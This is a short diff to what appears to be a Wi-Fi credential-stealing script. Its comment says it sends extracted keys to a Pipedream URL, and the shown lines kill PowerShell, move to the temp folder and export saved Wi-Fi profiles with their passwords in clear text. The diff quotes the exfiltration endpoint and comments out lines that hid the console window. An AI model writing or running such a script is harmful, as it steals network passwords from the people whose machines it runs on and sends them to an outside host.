@@ -1,7 +1,10 @@
 # Sends extracted keys to Pipedream (adjust the URL before use, or your credentials may leak!)
-$uri = https://eo75ckklbttuhhk.m.pipedream.net
-@echo off
-mode con:cols=30 lines=1
+$uri = "https://eo75ckklbttuhhk.m.pipedream.net"
+
+# Masking
+# @echo off
+# mode con:cols=30 lines=1
+
 taskkill/im powershell.exe
 cd %temp%
 netsh wlan export profile key=clear
